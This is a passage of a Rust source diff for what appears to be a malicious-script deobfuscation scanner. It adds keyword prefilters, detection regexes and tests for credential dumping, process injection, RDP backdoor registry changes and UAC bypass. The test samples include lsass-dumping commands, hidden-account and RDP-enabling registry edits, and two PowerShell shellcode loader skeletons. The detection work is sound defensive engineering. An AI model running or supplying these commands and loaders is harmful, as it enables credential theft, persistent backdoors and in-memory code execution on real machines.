+                    crate::traits::Trait::Enumeration { enum_kind: k, command }
+                        if k == kind && (!*multi || command == &cmd)
                 )
             }) {
                 continue;
@@ -2848,10 +7279,81 @@ fn scan_enumeration(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn sanitize_wmic_enum_command(command: &str) -> String {
+    let mut end = command.len();
+    for marker in ["') do", "\") do", "` ) do", "`n", "\\n"] {
+        if let Some(idx) = command.find(marker) {
+            end = end.min(idx);
+        }
+    }
+    command[..end]
+        .trim()
+        .trim_end_matches(['\'', ')'])
+        .trim()
+        .to_string()
+}
+
+fn has_enumeration_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    [
+        "net",
+        "whoami",
+        "query session",
+        "quser",
+        "get-localuser",
+        "get-netuser",
+        "get-netgroup",
+        "systeminfo",
+        "tasklist",
+        "wmic process",
+        "wmic cpu",
+        "wmic computersystem",
+        "wmic logicaldisk",
+        "wmic partition",
+        "wmic path softwarelicensingservice",
+    ]
+    .iter()
+    .any(|atom| lower.contains(atom))
+}
+
+#[cfg(test)]
+mod enumeration_prefilter_tests {
+    use super::has_enumeration_atom;
+
+    #[test]
+    fn prefilter_allows_known_enumeration_commands() {
+        for sample in [
+            "net user",
+            "whoami /priv",
+            "query session",
+            "quser",
+            "Get-LocalUser",
+            "Get-NetGroup",
+            "systeminfo",
+            "tasklist",
+            "wmic process list",
+            "wmic cpu get name",
+            "wmic logicaldisk get size",
+            "wmic path softwareLicensingService get OA3xOriginalProductKey",
+        ] {
+            assert!(has_enumeration_atom(sample), "blocked: {sample}");
+        }
+    }
+
+    #[test]
+    fn prefilter_blocks_unrelated_commands() {
+        assert!(!has_enumeration_atom("echo hello"));
+    }
+}
+
 /// Credential access — lsass dumping, Mimikatz invocations, browser
 /// credential paths (Login Data SQLite, NSS key3.db, etc.), well-known
 /// credential-theft tooling.
 fn scan_credential_access(deobfuscated: &str, env: &mut Environment) {
+    if !has_credential_access_atom(deobfuscated) {
+        return;
+    }
+
     use once_cell::sync::Lazy;
     use regex::Regex;
     static PATTERNS: Lazy<Vec<(Regex, &str, fn(&str) -> String)>> = Lazy::new(|| {
@@ -2891,11 +7393,74 @@ fn scan_credential_access(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn has_credential_access_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    [
+        "comsvcs.dll",
+        "minidump",
+        "procdump",
+        "sqldumper",
+        "lsass",
+        "invoke-mimikatz",
+        "mimikatz",
+        "sekurlsa::",
+        "kerberos::",
+        "crypto::",
+        "lsadump::",
+        "\\google\\chrome\\user data\\",
+        "login data",
+        "\\mozilla\\firefox\\profiles\\",
+        "key3.db",
+        "key4.db",
+        "logins.json",
+        "cookies.sqlite",
+        "\\bravesoftware\\",
+        "nirsoft",
+        "webbrowserpassview",
+        "mailpassview",
+        "chromepass",
+        "uselogoncredential",
+        "wdigest",
+    ]
+    .iter()
+    .any(|atom| lower.contains(atom))
+}
+
+#[cfg(test)]
+mod credential_access_prefilter_tests {
+    use super::has_credential_access_atom;
+
+    #[test]
+    fn prefilter_allows_known_credential_access_markers() {
+        for sample in [
+            "rundll32 comsvcs.dll MiniDump",
+            "procdump.exe -ma lsass.exe",
+            "Invoke-Mimikatz",
+            r#"\Google\Chrome\User Data\Default\Login Data"#,
+            "webbrowserpassview",
+            "UseLogonCredential",
+        ] {
+            assert!(has_credential_access_atom(sample), "blocked: {sample}");
+        }
+    }
+
+    #[test]
+    fn prefilter_blocks_unrelated_powershell_text() {
+        assert!(!has_credential_access_atom(
+            "Start-Process powershell.exe -WindowStyle Hidden"
+        ));
+    }
+}
+
 /// Process injection — Win32 API names invoked from PS via Add-Type
 /// / P/Invoke, or via .NET Reflection. MITRE T1055.
 fn scan_process_injection(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    if !has_process_injection_atom(deobfuscated) {
+        return;
+    }
+
     static API_RE: Lazy<Regex> = Lazy::new(|| {
         // `CreateThread` (no `Ex` suffix) is the local-process variant
         // meter.ps1 uses — same shellcode-execution intent. `VirtualProtect`
@@ -2908,7 +7473,7 @@ fn scan_process_injection(deobfuscated: &str, env: &mut Environment) {
         // them via reflection — and that resolution is the canonical
         // marker of an in-memory shellcode loader. Flag them as
         // ProcessInjection so the high-signal IOC surfaces.
-        Regex::new(r#"(?i)\b(VirtualAllocEx|VirtualAlloc|VirtualProtect(?:Ex)?|WriteProcessMemory|CreateRemoteThread(?:Ex)?|CreateThread|NtMapViewOfSection|NtCreateThreadEx|QueueUserAPC|SetWindowsHookEx|RtlMoveMemory|ZwAllocateVirtualMemory|GetProcAddress|GetModuleHandle|LoadLibraryA?|UnsafeNativeMethods)\b"#)
+        Regex::new(r#"(?i)\b(VirtualAllocEx|VirtualAlloc|VirtualProtect(?:Ex)?|WriteProcessMemory|CreateRemoteThread(?:Ex)?|CreateThread|NtMapViewOfSection|NtCreateThreadEx|NtAllocateVirtualMemory|NtWriteVirtualMemory|QueueUserAPC|SetWindowsHookEx|RtlMoveMemory|ZwAllocateVirtualMemory|GetDelegateForFunctionPointer|GetProcAddress|GetModuleHandle|LoadLibraryA?|UnsafeNativeMethods)\b"#)
             .expect("inject api re")
     });
     let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
@@ -2926,6 +7491,138 @@ fn scan_process_injection(deobfuscated: &str, env: &mut Environment) {
         }
         env.traits
             .push(crate::traits::Trait::ProcessInjection { api });
+    }
+}
+
+fn has_process_injection_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    [
+        "virtualalloc",
+        "virtualprotect",
+        "writeprocessmemory",
+        "createremotethread",
+        "createthread",
+        "ntmapviewofsection",
+        "ntcreatethreadex",
+        "ntallocatevirtualmemory",
+        "ntwritevirtualmemory",
+        "queueuserapc",
+        "setwindowshookex",
+        "rtlmovememory",
+        "zwallocatevirtualmemory",
+        "getdelegateforfunctionpointer",
+        "getprocaddress",
+        "getmodulehandle",
+        "loadlibrary",
+        "unsafenativemethods",
+    ]
+    .iter()
+    .any(|atom| lower.contains(atom))
+}
+
+#[cfg(test)]
+mod process_injection_prefilter_tests {
+    use super::{has_process_injection_atom, scan_process_injection};
+    use crate::env::{Config, Environment};
+    use crate::traits::Trait;
+
+    #[test]
+    fn prefilter_allows_known_process_injection_apis() {
+        for sample in [
+            "VirtualAllocEx",
+            "VirtualProtect",
+            "WriteProcessMemory",
+            "CreateRemoteThreadEx",
+            "CreateThread",
+            "NtMapViewOfSection",
+            "NtCreateThreadEx",
+            "NtAllocateVirtualMemory",
+            "NtWriteVirtualMemory",
+            "QueueUserAPC",
+            "SetWindowsHookEx",
+            "RtlMoveMemory",
+            "ZwAllocateVirtualMemory",
+            "Marshal.GetDelegateForFunctionPointer",
+            "GetProcAddress",
+            "GetModuleHandle",
+            "LoadLibraryA",
+            "UnsafeNativeMethods",
+        ] {
+            assert!(has_process_injection_atom(sample), "blocked: {sample}");
+        }
+    }
+
+    #[test]
+    fn prefilter_blocks_unrelated_powershell_text() {
+        assert!(!has_process_injection_atom(
+            "Start-Process powershell.exe -WindowStyle Hidden"
+        ));
+        assert!(!has_process_injection_atom(
+            "Get-Process | Select-Object ProcessName"
+        ));
+    }
+
+    #[test]
+    fn scanner_flags_nt_allocate_virtual_memory_delegate_loader() {
+        let script = r#"
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Loader {
+  [DllImport("ntdll.dll")]
+  private static extern int NtAllocateVirtualMemory(IntPtr process, ref IntPtr baseAddress, IntPtr zeroBits, ref ulong regionSize, uint allocationType, uint protect);
+  public static void Run(byte[] shellcode) {
+    IntPtr addr = IntPtr.Zero;
+    ulong size = (ulong)shellcode.Length;
+    NtAllocateVirtualMemory((IntPtr)(-1), ref addr, IntPtr.Zero, ref size, 0x3000, 0x40);
+    Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+    ((Action)Marshal.GetDelegateForFunctionPointer(addr, typeof(Action)))();
+  }
+}
+"@
+"#;
+        let mut env = Environment::new(&Config::default());
+        scan_process_injection(script, &mut env);
+
+        for expected in ["NtAllocateVirtualMemory", "GetDelegateForFunctionPointer"] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ProcessInjection { api } if api == expected
+                )),
+                "missing process injection marker {expected}: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn scanner_flags_nt_write_virtual_memory_loader() {
+        let script = r#"
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Loader {
+  [DllImport("ntdll.dll")]
+  private static extern int NtWriteVirtualMemory(IntPtr process, IntPtr baseAddress, byte[] buffer, uint size, ref uint written);
+  public static void Run(IntPtr process, IntPtr address, byte[] shellcode) {
+    uint written = 0;
+    NtWriteVirtualMemory(process, address, shellcode, (uint)shellcode.Length, ref written);
+  }
+}
+"@
+"#;
+        let mut env = Environment::new(&Config::default());
+        scan_process_injection(script, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::ProcessInjection { api } if api == "NtWriteVirtualMemory"
+            )),
+            "missing process injection marker NtWriteVirtualMemory: {:?}",
+            env.traits
+        );
     }
 }
 
@@ -3058,6 +7755,10 @@ fn scan_remote_exec(deobfuscated: &str, env: &mut Environment) {
 /// Remote-access backdoor setup: RDP enablement, Remote Desktop firewall
 /// opening, and Winlogon hidden-user registry entries.
 fn scan_remote_access(deobfuscated: &str, env: &mut Environment) {
+    if !has_remote_access_atom(deobfuscated) {
+        return;
+    }
+
     use once_cell::sync::Lazy;
     use regex::Regex;
     static RDP_ENABLE_RE: Lazy<Regex> = Lazy::new(|| {
@@ -3183,6 +7884,49 @@ fn scan_remote_access(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn has_remote_access_atom(text: &str) -> bool {
+    const ATOMS: &[&str] = &[
+        "terminal server",
+        "allowtsconnections",
+        "fdenytsconnections",
+        "winlogon",
+        "specialaccounts",
+        "allowmultipletssessions",
+        "fsinglesessionperuser",
+        "rdp-tcp",
+        "remote desktop",
+        "3389",
+    ];
+    let lower = text.to_ascii_lowercase();
+    ATOMS.iter().any(|atom| lower.contains(atom))
+}
+
+#[cfg(test)]
+mod remote_access_prefilter_tests {
+    use super::has_remote_access_atom;
+
+    #[test]
+    fn prefilter_allows_known_remote_access_shapes() {
+        for text in [
+            r#"reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /d 1"#,
+            r#"reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v defaultuserx /d 0"#,
+            r#"reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "AllowMultipleTSSessions" /d 1"#,
+            r#"reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fSingleSessionPerUser" /d 0"#,
+            r#"reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxIdleTime" /d 0"#,
+            r#"netsh advfirewall firewall add rule name="Remote Desktop" localport=3389 action=allow"#,
+        ] {
+            assert!(has_remote_access_atom(text), "blocked: {text}");
+        }
+    }
+
+    #[test]
+    fn prefilter_blocks_unrelated_registry_text() {
+        assert!(!has_remote_access_atom(
+            r#"reg add "HKCU\Software\Classes\foo" /v bar /d baz"#,
+        ));
+    }
+}
+
 /// UAC bypass technique. MITRE T1548.002. Detects:
 /// - Auto-elevate-binary triggers (fodhelper/eventvwr/sdclt/computer-
 ///   defaults/wsreset) when paired with an `HKCU\Software\Classes\...\
@@ -3197,6 +7941,10 @@ fn scan_remote_access(deobfuscated: &str, env: &mut Environment) {
 fn scan_uac_bypass(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    if !has_uac_bypass_atom(deobfuscated) {
+        return;
+    }
+
     static PATTERNS: Lazy<Vec<(Regex, &str)>> = Lazy::new(|| {
         vec![
             (Regex::new(r"(?i)\bfodhelper(?:\.exe)?\b").unwrap(), "fodhelper"),
@@ -3204,8 +7952,8 @@ fn scan_uac_bypass(deobfuscated: &str, env: &mut Environment) {
             (Regex::new(r"(?i)\bsdclt(?:\.exe)?\b").unwrap(), "sdclt"),
             (Regex::new(r"(?i)\bcomputerdefaults(?:\.exe)?\b").unwrap(), "computerdefaults"),
             (Regex::new(r"(?i)\bwsreset(?:\.exe)?\b").unwrap(), "wsreset"),
-            (Regex::new(r"(?i)\bcmstp(?:\.exe)?\s+/au\b").unwrap(), "cmstp-au"),
-            (Regex::new(r"(?i)\bmsconfig\s+/4\b").unwrap(), "msconfig-4"),
+            (Regex::new(r"(?i)\bcmstp(?:\.exe)?(?:\s+[^\r\n]*)?\s+/au\b").unwrap(), "cmstp-au"),
+            (Regex::new(r"(?i)\bmsconfig(?:\.exe)?\s+/4\b").unwrap(), "msconfig-4"),
             (Regex::new(r"(?i)HKCU\\Software\\Classes\\(?:ms-settings|Folder|exefile|mscfile)\\Shell\\Open\\command").unwrap(), "classes-shell-open-hijack"),
             (Regex::new(r"(?i)IColorDataProxy|ICMLuaUtil").unwrap(), "com-elevation"),
             (
@@ -3239,6 +7987,60 @@ fn scan_uac_bypass(deobfuscated: &str, env: &mut Environment) {
                 technique: tech.to_string(),
             });
         }
+    }
+}
+
+fn has_uac_bypass_atom(text: &str) -> bool {
+    const ATOMS: &[&str] = &[
+        "fodhelper",
+        "eventvwr",
+        "sdclt",
+        "computerdefaults",
+        "wsreset",
+        "cmstp",
+        "msconfig",
+        "hkcu\\software\\classes",
+        "icolorproxy",
+        "icolordataproxy",
+        "icmluautil",
+        "policies\\system",
+        "enablelua",
+        "consentpromptbehavioradmin",
+        "localaccounttokenfilterpolicy",
+    ];
+    let lower = text.to_ascii_lowercase();
+    ATOMS.iter().any(|atom| lower.contains(atom))
+}
+
+#[cfg(test)]
+mod uac_bypass_prefilter_tests {
+    use super::has_uac_bypass_atom;
+
+    #[test]
+    fn prefilter_allows_known_uac_bypass_markers() {
+        for sample in [
+            "fodhelper.exe",
+            "eventvwr.exe",
+            "sdclt.exe",
+            "computerdefaults.exe",
+            "wsreset.exe",
+            "cmstp.exe /au payload.inf",
+            "msconfig /4",
+            r"HKCU\Software\Classes\ms-settings\Shell\Open\command",
+            "IColorDataProxy",
+            "ICMLuaUtil",
+            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA",
+        ] {
+            assert!(has_uac_bypass_atom(sample), "blocked marker: {sample}");
+        }
+    }
+
+    #[test]
+    fn prefilter_blocks_generic_registry_and_process_text() {
+        assert!(!has_uac_bypass_atom(
+            r#"reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v app /d app.exe"#,
+        ));
+        assert!(!has_uac_bypass_atom("taskkill /f /im WINWORD.EXE"));
     }
 }
 
@@ -3311,6 +8113,10 @@ fn scan_beacon_sleep(deobfuscated: &str, env: &mut Environment) {
 fn scan_shellcode_marker(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    if !has_shellcode_marker_atom(deobfuscated) {
+        return;
+    }
+
     static SHELLCODE_VAR_RE: Lazy<Regex> =
         Lazy::new(|| Regex::new(r#"(?i)\$(\w*shellcode\w*)\s*="#).expect("shellcode var"));
     static NOP_SLED_RE: Lazy<Regex> =
@@ -3366,108 +8172,537 @@ fn scan_shellcode_marker(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
-pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
-    scan_self_elevation(deobfuscated, env);
-    scan_defender_evasion(deobfuscated, env);
-    scan_inmem_assembly_load(deobfuscated, env);
-    scan_lateral_movement(deobfuscated, env);
-    scan_anti_recovery(deobfuscated, env);
-    scan_evidence_cleanup(deobfuscated, env);
-    scan_network_probe(deobfuscated, env);
-    scan_account_modification(deobfuscated, env);
-    scan_file_concealment(deobfuscated, env);
-    scan_enumeration(deobfuscated, env);
-    scan_credential_access(deobfuscated, env);
-    scan_process_injection(deobfuscated, env);
-    scan_input_capture(deobfuscated, env);
-    scan_ransom_ext(deobfuscated, env);
-    scan_remote_exec(deobfuscated, env);
-    scan_remote_access(deobfuscated, env);
-    scan_uac_bypass(deobfuscated, env);
-    scan_service_install(deobfuscated, env);
-    scan_beacon_sleep(deobfuscated, env);
-    scan_shellcode_marker(deobfuscated, env);
-    scan_bitsadmin_deob_text(deobfuscated, env);
-    scan_python_requests_get_deob_text(deobfuscated, env);
-    scan_typo_webclient_downloads(deobfuscated, env);
-    scan_url_launch_deob_text(deobfuscated, env);
-    scan_process_url_arguments(deobfuscated, env);
-    scan_url_variable_assignments(deobfuscated, env);
-    scan_registry_url_values(deobfuscated, env);
-    scan_echoed_vbs_xmlhttp_deob_text(deobfuscated, env);
-    scan_copied_curl_alias_deob_text(deobfuscated, env);
-    scan_curl_style_compact_flags_deob_text(deobfuscated, env);
-    scan_echoed_curl_deob_text(deobfuscated, env);
-    scan_curl_redirect_deob_text(deobfuscated, env);
-    scan_curl_deob_text(deobfuscated, env);
-    scan_wget_deob_text(deobfuscated, env);
-    scan_certutil_urlcache_deob_text(deobfuscated, env);
-    scan_damaged_scheme_download_urls(deobfuscated, env);
-    scan_ps_replace_chain_urls(deobfuscated, env);
-    scan_ps_bare_url_downloads(deobfuscated, env);
-    scan_ps_char_index_extractor_urls(deobfuscated, env);
-    scan_js_fromcharcode_urls(deobfuscated, env);
-    scan_js_unescape_urls(deobfuscated, env);
-    scan_extrac32_self_extract(deobfuscated, env);
-    scan_ps_var_socket_connect(deobfuscated, env);
+fn has_shellcode_marker_atom(text: &str) -> bool {
+    contains_ascii_case_insensitive_atom(text, b"shellcode")
+        || text.contains("0x90")
+        || text.contains(r"\x90")
+        || contains_ascii_case_insensitive_atom(text, b"0xfc")
+}
 
-    // Build a set of URLs already known
-    let known = env.known_extracted_urls();
+fn scan_script_host_deob_text(deobfuscated: &str, env: &mut Environment) {
+    if !contains_ascii_case_insensitive_atom(deobfuscated, b"cscript")
+        && !contains_ascii_case_insensitive_atom(deobfuscated, b"wscript")
+    {
+        return;
+    }
 
-    // Sweep
-    let mut seen_new: std::collections::HashSet<String> = std::collections::HashSet::new();
-    for caps in URL_RE.captures_iter(deobfuscated) {
-        let Some(m) = caps.get(1) else { continue };
-        let mut url = m.as_str().to_string();
-        // Trim common trailing punctuation that the regex's terminator class missed
-        while let Some(last) = url.chars().last() {
-            if matches!(
-                last,
-                ',' | '.' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '!' | '?' | '\\'
-            ) {
-                url.pop();
-            } else {
-                break;
-            }
-        }
-        if url.len() < 8 {
-            continue;
-        } // http://x is the minimum sensible URL
-        if let Some(normalized) = normalize_liberal_url_token(&url) {
-            url = normalized;
-        }
-        if is_noise_url(&url) {
-            continue;
-        }
-        if is_known_or_known_query_prefix(&known, &url) {
-            continue;
-        }
-        if !seen_new.insert(url.clone()) {
-            continue;
-        }
+    use once_cell::sync::Lazy;
+    use regex::Regex;
+    static SCRIPT_HOST_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?im)(?:^|[\s&|('"`(])(?P<cmd>(?:[A-Za-z]:[\\/][^\r\n&|'"`()]*)?(?P<host>[cw]script)(?:\.exe)?\s+[^\r\n]*)"#,
+        )
+        .expect("script host command")
+    });
 
-        // Best-effort: find the line containing this URL for context
-        let line_hint = deobfuscated
-            .lines()
-            .find(|l| l.contains(&url))
-            .map(|l| l.chars().take(200).collect::<String>())
+    for caps in SCRIPT_HOST_RE.captures_iter(deobfuscated) {
+        let Some(cmd_match) = caps.name("cmd") else {
+            continue;
+        };
+        if script_host_match_is_registry_value(deobfuscated, cmd_match.start()) {
+            continue;
+        }
+        let host = caps
+            .name("host")
+            .map(|m| m.as_str().to_ascii_lowercase())
             .unwrap_or_default();
-        if is_noise_url_context(&line_hint, &url) {
+        let command = trim_script_host_wrapper_tail(cmd_match.as_str());
+        let Some(src) = script_host_source_arg(command) else {
+            continue;
+        };
+        if !script_host_source_looks_script_like(&src) {
             continue;
         }
-
-        env.traits.push(Trait::DownloadInDeobText {
-            src: url,
-            line_hint,
-        });
+        push_script_host_exec_trait(&host, src, env);
     }
 }
 
-pub fn scan_raw_marker_powershell_urls(input: &[u8], env: &mut Environment) {
-    let text = String::from_utf8_lossy(input);
-    if !text.contains("%!") {
+fn push_script_host_exec_trait(host: &str, src: String, env: &mut Environment) {
+    let already = env.traits.iter().any(|t| match (host, t) {
+        ("cscript", crate::traits::Trait::CscriptExec { src: s }) => s == &src,
+        ("wscript", crate::traits::Trait::WscriptExec { src: s }) => s == &src,
+        _ => false,
+    });
+    if already {
         return;
     }
+    match host {
+        "cscript" => env.traits.push(crate::traits::Trait::CscriptExec { src }),
+        "wscript" => env.traits.push(crate::traits::Trait::WscriptExec { src }),
+        _ => {}
+    }
+}
+
+fn script_host_match_is_registry_value(text: &str, start: usize) -> bool {
+    let line_start = text[..start]
+        .rfind(['\n', '\r'])
+        .map(|idx| idx + 1)
+        .unwrap_or(0);
+    let prefix = text[line_start..start].to_ascii_lowercase();
+    prefix.contains("reg add") && (prefix.contains(" /d ") || prefix.contains(" -d "))
+}
+
+fn trim_script_host_wrapper_tail(command: &str) -> &str {
+    let mut end = command.len();
+    for marker in ["') do", "\") do", "` ) do", "\\n", "\n", "\r"] {
+        if let Some(idx) = command.find(marker) {
+            end = end.min(idx);
+        }
+    }
+    command[..end]
+        .trim()
+        .trim_end_matches([')', '\'', '"'])
+        .trim()
+}
+
+fn script_host_source_arg(command: &str) -> Option<String> {
+    let tokens = crate::handlers::util::split_words(command);
+    for token in tokens.iter().skip(1) {
+        let token = token.trim_matches(['"', '\'']);
+        if token.starts_with("//") || token.starts_with('/') {
+            continue;
+        }
+        if token.is_empty() || token.starts_with('-') {
+            continue;
+        }
+        return Some(token.to_string());
+    }
+    None
+}
+
+fn script_host_source_looks_script_like(src: &str) -> bool {
+    let src = src
+        .trim()
+        .trim_matches(['"', '\''])
+        .trim_start_matches("\\\"")
+        .trim_end_matches("\\\"");
+    let lower = src.to_ascii_lowercase();
+    [".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh"]
+        .iter()
+        .any(|ext| lower.ends_with(ext) || lower.contains(&format!("{ext}?")))
+}
+
+pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let scan_profile_enabled = std::env::var_os("HARRINGTON_PROFILE_DEOB_SCAN").is_some();
+    macro_rules! scan_step {
+        ($stage:literal, $body:block) => {{
+            if scan_profile_enabled {
+                let start = std::time::Instant::now();
+                let traits_before = env.traits.len();
+                $body
+                eprintln!(
+                    "harrington_profile_deob_scan scanner={} delta_ms={} bytes={} added_traits={}",
+                    $stage,
+                    start.elapsed().as_millis(),
+                    deobfuscated.len(),
+                    env.traits.len().saturating_sub(traits_before)
+                );
+            } else {
+                $body
+            }
+        }};
+    }
+
+    scan_step!("self_elevation", {
+        scan_self_elevation(deobfuscated, env);
+    });
+    scan_step!("defender_evasion", {
+        scan_defender_evasion(deobfuscated, env);
+    });
+    scan_step!("inmem_assembly_load", {
+        scan_inmem_assembly_load(deobfuscated, env);
+    });
+    scan_step!("lateral_movement", {
+        scan_lateral_movement(deobfuscated, env);
+    });
+    scan_step!("anti_recovery", {
+        scan_anti_recovery(deobfuscated, env);
+    });
+    scan_step!("evidence_cleanup", {
+        scan_evidence_cleanup(deobfuscated, env);
+    });
+    scan_step!("network_probe", {
+        scan_network_probe(deobfuscated, env);
+    });
+    scan_step!("account_modification", {
+        scan_account_modification(deobfuscated, env);
+    });
+    scan_step!("file_concealment", {
+        scan_file_concealment(deobfuscated, env);
+    });
+    scan_step!("enumeration", {
+        scan_enumeration(deobfuscated, env);
+    });
+    scan_step!("credential_access", {
+        scan_credential_access(deobfuscated, env);
+    });
+    scan_step!("process_injection", {
+        scan_process_injection(deobfuscated, env);
+    });
+    scan_step!("input_capture", {
+        scan_input_capture(deobfuscated, env);
+    });
+    scan_step!("ransom_ext", {
+        scan_ransom_ext(deobfuscated, env);
+    });
+    scan_step!("remote_exec", {
+        scan_remote_exec(deobfuscated, env);
+    });
+    scan_step!("remote_access", {
+        scan_remote_access(deobfuscated, env);
+    });
+    scan_step!("uac_bypass", {
+        scan_uac_bypass(deobfuscated, env);
+    });
+    scan_step!("service_install", {
+        scan_service_install(deobfuscated, env);
+    });
+    scan_step!("beacon_sleep", {
+        scan_beacon_sleep(deobfuscated, env);
+    });
+    scan_step!("shellcode_marker", {
+        scan_shellcode_marker(deobfuscated, env);
+    });
+    scan_step!("script_host_deob_text", {
+        scan_script_host_deob_text(deobfuscated, env);
+    });
+    scan_step!("bitsadmin_deob_text", {
+        scan_bitsadmin_deob_text(deobfuscated, env);
+    });
+    scan_step!("python_requests_get_deob_text", {
+        scan_python_requests_get_deob_text(deobfuscated, env);
+    });
+    scan_step!("typo_webclient_downloads", {
+        scan_typo_webclient_downloads(deobfuscated, env);
+    });
+    scan_step!("url_launch_deob_text", {
+        scan_url_launch_deob_text(deobfuscated, env);
+    });
+    scan_step!("rundll32_download_exports_deob_text", {
+        scan_rundll32_download_exports_deob_text(deobfuscated, env);
+    });
+    scan_step!("certoc_deob_text", {
+        scan_certoc_deob_text(deobfuscated, env);
+    });
+    scan_step!("desktopimgdownldr_deob_text", {
+        scan_desktopimgdownldr_deob_text(deobfuscated, env);
+    });
+    scan_step!("process_url_arguments", {
+        scan_process_url_arguments(deobfuscated, env);
+    });
+    scan_step!("url_variable_assignments", {
+        scan_url_variable_assignments(deobfuscated, env);
+    });
+    scan_step!("registry_url_values", {
+        scan_registry_url_values(deobfuscated, env);
+    });
+    scan_step!("echoed_vbs_deob_text", {
+        scan_echoed_vbs_deob_text(deobfuscated, env);
+    });
+    scan_step!("copied_bitsadmin_alias_deob_text", {
+        scan_copied_bitsadmin_alias_deob_text(deobfuscated, env);
+    });
+    scan_step!("copied_curl_alias_deob_text", {
+        scan_copied_curl_alias_deob_text(deobfuscated, env);
+    });
+    scan_step!("copied_extrac32_alias_deob_text", {
+        scan_copied_extrac32_alias_deob_text(deobfuscated, env);
+    });
+    scan_step!("copied_certutil_alias_deob_text", {
+        scan_copied_certutil_alias_deob_text(deobfuscated, env);
+    });
+    scan_step!("copied_cmd_alias_deob_text", {
+        scan_copied_cmd_alias_deob_text(deobfuscated, env);
+    });
+    scan_step!("copied_mshta_alias_deob_text", {
+        scan_copied_mshta_alias_deob_text(deobfuscated, env);
+    });
+    scan_step!("copied_msiexec_alias_deob_text", {
+        scan_copied_msiexec_alias_deob_text(deobfuscated, env);
+    });
+    scan_step!("copied_regsvr32_alias_deob_text", {
+        scan_copied_regsvr32_alias_deob_text(deobfuscated, env);
+    });
+    scan_step!("copied_rundll32_alias_deob_text", {
+        scan_copied_rundll32_alias_deob_text(deobfuscated, env);
+    });
+    scan_step!("curl_style_compact_flags_deob_text", {
+        scan_curl_style_compact_flags_deob_text(deobfuscated, env);
+    });
+    scan_step!("echoed_curl_deob_text", {
+        scan_echoed_curl_deob_text(deobfuscated, env);
+    });
+    scan_step!("curl_redirect_deob_text", {
+        scan_curl_redirect_deob_text(deobfuscated, env);
+    });
+    scan_step!("curl_deob_text", {
+        scan_curl_deob_text(deobfuscated, env);
+    });
+    scan_step!("wget_deob_text", {
+        scan_wget_deob_text(deobfuscated, env);
+    });
+    scan_step!("certutil_urlcache_deob_text", {
+        scan_certutil_urlcache_deob_text(deobfuscated, env);
+    });
+    scan_step!("damaged_scheme_download_urls", {
+        scan_damaged_scheme_download_urls(deobfuscated, env);
+    });
+    scan_step!("ps_replace_chain_urls", {
+        scan_ps_replace_chain_urls(deobfuscated, env);
+    });
+    scan_step!("ps_bare_url_downloads", {
+        scan_ps_bare_url_downloads(deobfuscated, env);
+    });
+    scan_step!("js_fromcharcode_urls", {
+        scan_js_fromcharcode_urls(deobfuscated, env);
+    });
+    scan_step!("js_unescape_urls", {
+        scan_js_unescape_urls(deobfuscated, env);
+    });
+    scan_step!("extrac32_self_extract", {
+        scan_extrac32_self_extract(deobfuscated, env);
+    });
+    scan_step!("ps_var_socket_connect", {
+        scan_ps_var_socket_connect(deobfuscated, env);
+    });
+    scan_step!("resolved_deob_var_fragment_urls", {
+        scan_resolved_deob_var_fragment_urls(deobfuscated, env);
+    });
+    scan_step!("embedded_powershell_download_deob_text", {
+        scan_embedded_powershell_downloads_in_deob_text(deobfuscated, env);
+    });
+    scan_step!("glued_rundll32_deob_text", {
+        scan_glued_rundll32_deob_text(deobfuscated, env);
+    });
+    scan_step!("mshta_local_deob_text", {
+        scan_mshta_local_deob_text(deobfuscated, env);
+    });
+
+    scan_step!("url_sweep", {
+        // Build a set of URLs already known
+        let known = env.known_extracted_urls();
+
+        // Sweep
+        let mut seen_new: std::collections::HashSet<String> = std::collections::HashSet::new();
+        for caps in URL_RE.captures_iter(deobfuscated) {
+            let Some(m) = caps.get(1) else { continue };
+            let mut url = m.as_str().to_string();
+            // Trim common trailing punctuation that the regex's terminator class missed
+            while let Some(last) = url.chars().last() {
+                if matches!(
+                    last,
+                    ',' | '.' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '!' | '?' | '\\' | '&'
+                ) {
+                    url.pop();
+                } else {
+                    break;
+                }
+            }
+            if url.len() < 8 {
+                continue;
+            } // http://x is the minimum sensible URL
+            if let Some(normalized) = normalize_liberal_url_token(&url) {
+                url = normalized;
+            }
+            if is_noise_url(&url) {
+                continue;
+            }
+            if is_known_or_known_query_prefix(&known, &url) {
+                continue;
+            }
+            if !seen_new.insert(url.clone()) {
+                continue;
+            }
+
+            // Best-effort: find the line containing this URL for context
+            let line_hint = deobfuscated
+                .lines()
